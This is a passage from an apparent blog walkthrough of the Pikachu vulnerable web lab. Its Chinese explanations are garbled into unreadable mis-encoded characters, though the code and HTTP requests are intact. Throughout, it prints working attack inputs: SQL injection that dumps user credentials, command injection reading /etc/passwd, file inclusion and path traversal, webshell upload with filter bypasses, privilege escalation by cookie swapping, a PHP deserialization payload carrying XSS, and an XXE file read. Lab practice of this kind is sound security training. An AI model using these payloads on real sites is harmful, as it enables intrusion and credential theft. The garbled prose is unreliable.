</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu54.png" alt="pikachu54"></p> <h2 id="ç›²æ³¨-base-on-time"><a href="#ç›²æ³¨-base-on-time" class="header-anchor">#</a> ç›²æ³¨(base on time)</h2> <p>åŒæ ·sqlmapç›´æ¥è·‘</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>sqlmap <span class="token parameter variable">-r</span> header.txt â€“current-db
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu55.png" alt="pikachu55"></p> <h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="header-anchor">#</a> å®½å­—èŠ‚æ³¨å…¥</h2> <p>æ­£å¸¸è¾“å…¥kobeï¼ŒSQLè¯­å¥ä½¿ç”¨äº†likeæ¨¡ç³ŠæŸ¥è¯¢</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu56.png" alt="pikachu56"></p> <p><code>%'</code>é—­åˆæ— æ•ˆï¼Œå°è¯•å®½å­—èŠ‚é—­åˆï¼Œå…ˆæ¥ä¸ªä¸‡èƒ½æŸ¥è¯¢</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token operator">%</span>df' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu57.png" alt="pikachu57"></p> <p>æŸ¥æ˜¾ç¤ºä½ï¼ˆ2ä¸ªæ˜¾ç¤ºä½ï¼‰</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token operator">%</span>df' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu58.png" alt="pikachu58">
æŸ¥åº“åï¼ŒæŸ¥è¡¨å</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token operator">%</span>df' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu59.png" alt="pikachu59"></p> <p>æŸ¥usersè¡¨ä¸‹çš„æ•°æ®</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token operator">%</span>df' <span class="token keyword">union</span> <span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users<span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu60.png" alt="pikachu60"></p> <h1 id="rce"><a href="#rce" class="header-anchor">#</a> RCE</h1> <h2 id="exec-ping"><a href="#exec-ping" class="header-anchor">#</a> exec &quot;ping&quot;</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu61.png" alt="pikachu61"></p> <p>è¦æ±‚è¾“å…¥IPåœ°å€ï¼Œè¿™é‡Œå°è¯•æ‹¼æ¥å‘½ä»¤ï¼Œæäº¤åå‘ç°å¯ä»¥ç›´æ¥æ³¨å…¥å‘½ä»¤</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>localhost <span class="token operator">&amp;</span> <span class="token function">cat</span> /etc/passwd
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu62.png" alt="pikachu62"></p> <h2 id="exec-evel"><a href="#exec-evel" class="header-anchor">#</a> exec &quot;evel&quot;</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu63.png" alt="pikachu63"></p> <p>è¦æ±‚è¾“å…¥å­—ç¬¦ä¸²ï¼Œæç¤ºè¯´æ˜ä½¿ç”¨äº†evalå¯¹æ¥å—çš„å­—ç¬¦ä¸²è¿›è¡Œäº†æ‰§è¡Œï¼Œæäº¤åè¿”å›phpinfoé¡µé¢</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu64.png" alt="pikachu64"></p> <p>è¯´æ˜å¯ä»¥ç›´æ¥è¾“å…¥æ¶æ„phpä»£ç ï¼Œè¿›è¡ŒRCE</p> <h1 id="file-inclusion"><a href="#file-inclusion" class="header-anchor">#</a> File Inclusion</h1> <h2 id="file-inclusion-local"><a href="#file-inclusion-local" class="header-anchor">#</a> File Inclusion(local)</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu65.png" alt="pikachu65"></p> <p>é€‰æ‹©Kobe Bryantæäº¤åï¼Œå‘ç°urlå‘ç”Ÿäº†å˜åŒ–ï¼Œç–‘ä¼¼åŒ…å«äº†file1.phpæ–‡ä»¶</p> <p>è¿™é‡Œé€šè¿‡ç›®å½•çˆ†ç ´ï¼Œå¾—åˆ°<code>../../../../</code>ä¹‹åå°±æ˜¯ç³»ç»Ÿæ ¹ç›®å½•äº†ï¼Œè¿™é‡ŒæˆåŠŸåŒ…å«äº†/etc/passwdç›®å½•</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu66.png" alt="pikachu66"></p> <h2 id="file-inclusion-remote"><a href="#file-inclusion-remote" class="header-anchor">#</a> File Inclusion(remote)</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu67.png" alt="pikachu67"></p> <p>é€‰æ‹©Kobe Bryantæäº¤åï¼Œè¿˜æ˜¯urlå‘ç”Ÿäº†å˜åŒ–ï¼Œè¿™æ¬¡å°è¯•è¿œç¨‹åŒ…å«æ–‡ä»¶</p> <p>ç¼–å†™include.phpæ–‡ä»¶ï¼Œvpså¯åŠ¨httpæœåŠ¡</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>è®¿é—®http://172.26.239.122/vul/fileinclude/fi_remote.php?filename=http://172.26.239.122:4444/include.php&amp;submit=æäº¤åæˆåŠŸè¿œç¨‹åŒ…å«</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu68.png" alt="pikachu68"></p> <h1 id="unsafe-filedownload"><a href="#unsafe-filedownload" class="header-anchor">#</a> Unsafe Filedownload</h1> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu69.png" alt="pikachu69"></p> <p>éšä¾¿ç‚¹å‡»ä¸€ä¸ªï¼ŒæŠ“å–æ•°æ®åŒ…ï¼Œæ•°æ®åŒ…è¯·æ±‚ä¿¡æ¯å¦‚ä¸‹</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/vul/unsafedownload/execdownload.php?filename=kb.png</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/unsafedownload/down_nba.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>filenameåƒæ˜¯æ–‡ä»¶ï¼Œå°è¯•ä¿®æ”¹è¯¥å­—æ®µä¸º/etc/passwdï¼Œæç¤ºæ–‡ä»¶ä¸å­˜åœ¨</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu70.png" alt="pikachu70"></p> <p>åˆ©ç”¨æœ¬åœ°åŒ…å«çš„ä¿¡æ¯ï¼Œé‡æ–°ä¿®æ”¹ä¸º<code>../../../../etc/passwd</code>,æˆåŠŸä¸‹è½½è¯¥æ–‡ä»¶</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu71.png" alt="pikachu71"></p> <h1 id="unsafe-fileupload"><a href="#unsafe-fileupload" class="header-anchor">#</a> Unsafe Fileupload</h1> <h2 id="client-check"><a href="#client-check" class="header-anchor">#</a> client check</h2> <p>ç¼–å†™ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶shell.phpï¼Œå°è¯•ä¸Šä¼ æŠ“åŒ…</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu72.png" alt="pikachu72"></p> <p>å‘ç°å¹¶æ²¡æœ‰æ•°æ®åŒ…å‘å‡ºï¼Œå°±æ”¶åˆ°äº†éªŒè¯ä¿¡æ¯ï¼Œä¸ºå‰ç«¯éªŒè¯ï¼Œç›´æ¥ä¿®æ”¹åç¼€ä¸ºjpgï¼ŒæŠ“åŒ…åå†æ”¹å›æ¥ç»•è¿‡</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu73.png" alt="pikachu73"></p> <p>æˆåŠŸä¸Šä¼ </p> <h2 id="mime-type"><a href="#mime-type" class="header-anchor">#</a> MIME type</h2> <p>è¿˜æ˜¯ä¼ shell.phpï¼Œè¿™æ¬¡æ”¹MIME typeä¹Ÿå°±æ˜¯Content-Type: image/jpeg</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu74.png" alt="pikachu74"></p> <p>æˆåŠŸä¸Šä¼ </p> <h2 id="getimagesize"><a href="#getimagesize" class="header-anchor">#</a> getimagesize</h2> <p>å‰ä¸¤ç§å•ç‹¬æˆ–ç»“åˆèµ·æ¥éƒ½æ²¡ç”¨äº†ï¼Œè¿™æ¬¡ç»™shell.phpå†…å®¹ä¸­å¢åŠ å›¾ç‰‡æ–‡ä»¶å¤´GIF89aï¼Œå†ä¸Šä¼ </p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu75.png" alt="pikachu75"></p> <p>è¿™ç§åé—¨æ–‡ä»¶æ²¡åŠæ³•é€šè¿‡è®¿é—®è§¦å‘äº†ï¼Œéœ€è¦é…åˆè§£ææ¼æ´æˆ–è€…æ–‡ä»¶åŒ…å«ä½¿ç”¨</p> <h1 id="over-permission"><a href="#over-permission" class="header-anchor">#</a> Over Permission</h1> <h2 id="æ°´å¹³è¶Šæƒ"><a href="#æ°´å¹³è¶Šæƒ" class="header-anchor">#</a> æ°´å¹³è¶Šæƒ</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu76.png" alt="pikachu76"></p> <p>å¼€å¯æŠ“åŒ…ç‚¹å‡»æŸ¥çœ‹ä¸ªäººä¿¡æ¯æŒ‰é’®</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu77.png" alt="pikachu77"></p> <p>è¯¥è¯·æ±‚æ•°æ®åŒ…å†…å®¹å¦‚ä¸‹</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/overpermission/op1/op1_mem.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=jdco7efq49sd079f9m6b68c6fq</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>å°è¯•ä¿®æ”¹usernameå­—æ®µä¸ºå…¶ä»–ç”¨æˆ·ä¾‹å¦‚ï¼švinceï¼Œå³å¯æ°´å¹³è¶Šæƒï¼Œä½¿ç”¨lucyè´¦æˆ·æŸ¥çœ‹vinceç”¨æˆ·çš„ä¿¡æ¯</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu78.png" alt="pikachu78"></p> <h2 id="å‚ç›´è¶Šæƒ"><a href="#å‚ç›´è¶Šæƒ" class="header-anchor">#</a> å‚ç›´è¶Šæƒ</h2> <p>å…ˆä½¿ç”¨è¶…çº§ç®¡ç†å‘˜è¿›è¡Œç™»å½•</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu79.png" alt="pikachu79"></p> <p>ç‚¹å‡»æ·»åŠ ç”¨æˆ·ï¼Œå¡«å…¥å¯¹åº”ä¿¡æ¯ï¼Œè¿›è¡ŒæŠ“åŒ…ï¼Œå¯¹åº”è¯·æ±‚æ•°æ®åŒ…å¦‚ä¸‹ï¼Œæš‚æ—¶å‘åˆ°Repeater</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/vul/overpermission/op2/op2_admin_edit.php</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">112</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/overpermission/op2/op2_admin_edit.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=jdco7efq49sd079f9m6b68c6fq</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
username=hacker&amp;password=hacker&amp;sex=hacker&amp;phonenum=hacker&amp;email=hacker&amp;address=hacker&amp;submit=%E5%88%9B%E5%BB%BA
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>æ¥ç€ç™»å½•æ™®é€šç”¨æˆ·ï¼ŒæŠ“å–æ™®é€šç”¨æˆ·çš„cookieï¼Œæ›¿æ¢è¶…çº§ç®¡ç†å‘˜çš„cookieéƒ¨åˆ†è¿›è¡Œå‘åŒ…</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu80.png" alt="pikachu80"></p> <p>å¯ä»¥çœ‹åˆ°æˆåŠŸä½¿ç”¨æ— æƒé™æ™®é€šç”¨æˆ·æ·»åŠ äº†ä¸€ä¸ªhackerçš„æ–°ç”¨æˆ·</p> <h1 id=""><a href="#" class="header-anchor">#</a> ../../</h1> <h2 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="header-anchor">#</a> ç›®å½•éå†</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu81.png" alt="pikachu81"></p> <p>è¿™ä¸ªå‰é¢æœ¬åœ°æ–‡ä»¶åŒ…å«æ—¶ç›´æ¥ç›®å½•çˆ†ç ´å¾—åˆ°äº†<code>../../../../</code>å°±æ˜¯ç³»ç»Ÿæ ¹ç›®å½•äº†ï¼Œåˆ©ç”¨è¿™ç‚¹éå†è¯»å–/etc/passwdæ–‡ä»¶</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu82.png" alt="pikachu82"></p> <h1 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="header-anchor">#</a> æ•æ„Ÿä¿¡æ¯æ³„éœ²</h1> <h2 id="icanseeyouabc"><a href="#icanseeyouabc" class="header-anchor">#</a> Icanseeyouabc</h2> <p>ç›´æ¥åœ¨é“¾æ¥å‰æ’å…¥view-source:ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç å…¶ä¸­æ³¨é‡Šéƒ¨åˆ†æ³„éœ²äº†è´¦å·ç­‰æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚ä¸‹</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token comment">&lt;!-- æµ‹è¯•è´¦å·:lili/123456--&gt;</span>
<span class="token comment">&lt;!-- /.widget-body --&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h1 id="phpååºåˆ—åŒ–æ¼æ´"><a href="#phpååºåˆ—åŒ–æ¼æ´" class="header-anchor">#</a> PHPååºåˆ—åŒ–æ¼æ´</h1> <p>phpæºä»£ç å¦‚ä¸‹</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">S</span><span class="token punctuation">{</span>
            <span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;pikachu&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        @<span class="token variable">$unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>ä½¿ç”¨ä¸‹åˆ—ä»£ç ç”Ÿæˆæ¶æ„åºåˆ—åŒ–æ•°æ®</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">S</span><span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token variable">$code</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">S</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>ç”Ÿæˆåºåˆ—åŒ–æ•°æ®å¦‚ä¸‹</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">&quot;S&quot;</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">&quot;test&quot;</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">39</span><span class="token punctuation">:</span><span class="token string double-quoted-string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æäº¤åï¼Œå¼¹å‡ºcookie</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu83.png" alt="pikachu83"></p> <h1 id="xxe"><a href="#xxe" class="header-anchor">#</a> XXE</h1> <h2 id="xxeæ¼æ´"><a href="#xxeæ¼æ´" class="header-anchor">#</a> XXEæ¼æ´</h2> <h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="header-anchor">#</a> æ¦‚è¿°</h3> <ul><li>XXEï¼ˆå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰æ˜¯XMLæ³¨å…¥çš„ä¸€ç§ï¼Œæ™®é€šçš„XMLæ³¨å…¥åˆ©ç”¨é¢æ¯”è¾ƒç‹­çª„ï¼Œå¦‚æœæœ‰çš„è¯ä¹Ÿæ˜¯é€»è¾‘ç±»æ¼æ´ï¼›XXEæ‰©å¤§äº†æ”»å‡»é¢</li> <li>å½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œå°±å¯èƒ½å¯¼è‡´<strong>ä»»æ„æ–‡ä»¶è¯»å–ã€ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ¢æµ‹ã€æ”»å‡»å†…ç½‘ç½‘ç«™</strong>ç­‰å±å®³</li> <li>é˜²å¾¡æ–¹æ³•ï¼šç¦ç”¨å¤–éƒ¨å®ä½“ï¼ˆPHPï¼šå¯ä»¥å°†libxml_disable_entity_loaderè®¾ç½®ä¸ºTRUEæ¥ç¦ç”¨å¤–éƒ¨å®ä½“ï¼‰</li></ul> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu84.png" alt="pikachu84"></p> <p>æˆ‘ä»¬åˆ©ç”¨å¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œè¯»å–/etc/passwdæ–‡ä»¶ï¼Œxml-dtdçš„payloadå¦‚ä¸‹</p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  &lt;!DOCTYPE creds [   &lt;!ENTITY goodies SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;  &lt;creds&gt;&amp;goodies;&lt;/creds&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu85.png" alt="pikachu85"></p> <p>å¯ä»¥çœ‹åˆ°æˆåŠŸè¯»å–äº†æ–‡ä»¶è¿›è¡Œæ˜¾ç¤º</p> <h1 id="urlé‡å®šå‘"><a href="#urlé‡å®šå‘" class="header-anchor">#</a> URLé‡å®šå‘</h1> <h2 id="ä¸å®‰å…¨çš„urlè·³è½¬"><a href="#ä¸å®‰å…¨çš„urlè·³è½¬" class="header-anchor">#</a> ä¸å®‰å…¨çš„urlè·³è½¬</h2> <ul><li>ä¸å®‰å…¨çš„urlè·³è½¬é—®é¢˜å¯èƒ½å‘ç”Ÿåœ¨ä¸€åˆ‡æ‰§è¡Œäº†urlåœ°å€è·³è½¬çš„åœ°æ–¹</li> <li>å¦‚æœåç«¯é‡‡ç”¨äº†å‰ç«¯ä¼ è¿›æ¥çš„(å¯èƒ½æ˜¯ç”¨æˆ·ä¼ å‚,æˆ–è€…ä¹‹å‰é¢„åŸ‹åœ¨å‰ç«¯é¡µçš„urlåœ°å€)å‚æ•°ä½œä¸ºäº†è·³è½¬çš„ç›®çš„åœ°,è€Œåˆæ²¡æœ‰åšåˆ¤æ–­çš„è¯å°±å¯èƒ½å‘ç”Ÿ&quot;è·³é”™å¯¹è±¡&quot;çš„é—®é¢˜</li> 